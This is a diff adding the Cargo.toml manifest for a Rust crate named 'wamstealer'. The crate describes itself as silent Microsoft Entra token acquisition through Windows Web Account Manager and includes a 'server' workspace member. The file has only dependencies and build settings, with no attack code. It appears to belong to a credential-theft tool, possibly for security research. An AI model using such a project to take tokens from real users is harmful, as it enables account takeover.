@@ -1,0 +1,32 @@
+[package]
+name = "wamstealer"
+version = "0.1.0"
+edition = "2021"
+rust-version = "1.82"
+description = "Silent Microsoft Entra token acquisition through Windows Web Account Manager"
+license = "MIT"
+publish = false
+
+[dependencies]
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+base64 = "0.22"
+
+[target.'cfg(windows)'.dependencies]
+reqwest = { version = "0.12", default-features = false, features = ["blocking", "json", "native-tls"] }
+windows = { version = "0.62.2", features = [
+    "Security_Authentication_Web_Core",
+    "Security_Credentials",
+    "Win32_Foundation",
+    "Win32_Globalization",
+    "Win32_System_WinRT",
+] }
+windows-future = "0.3.2"
+
+[profile.release]
+lto = true
+codegen-units = 1
+strip = true
+
+[workspace]
+members = ["server"]
